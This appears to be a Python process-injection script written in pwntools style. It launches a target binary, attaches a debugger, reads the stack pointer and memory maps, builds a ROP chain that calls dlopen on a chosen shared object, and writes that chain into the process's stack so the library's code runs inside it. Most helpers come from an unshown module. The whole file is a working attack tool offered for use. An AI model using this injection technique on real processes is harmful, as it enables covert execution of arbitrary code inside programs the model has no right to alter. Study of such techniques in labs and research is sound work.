#!/usr/bin/env python3
import argparse
from memutils import *

LIBC_PATH = "/usr/lib/x86_64-linux-gnu/libc.so.6"
PAGE_SIZE = 4096

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

def parse_args():
    parser = argparse.ArgumentParser(description="[*] process injection on a vulnerable binary.")
    parser.add_argument("binary", help="[*] path to the vulnerable binary.")
    parser.add_argument("so", help="[*] path to the shared object (.so) file.")
    return parser.parse_args()


def inject(user_args):
    target_process = process([user_args.binary])
    gdb.attach(target_process.pid)
    syscall_info = parse_proc_syscall(pid=target_process.pid)
    log.info(f"current rsp: {hex(syscall_info.rsp)}")
    maps = parse_maps(pid=target_process.pid)
    rop_chain = dl_open_rop(pid=target_process.pid, address=syscall_info.rsp, so_path=user_args.so, maps=maps)
    write_memory(pid=target_process.pid, address=syscall_info.rsp, content=rop_chain)
    target_process.interactive()

def main():
    user_args = parse_args()
    inject(user_args)

if __name__ == "__main__":
    main()
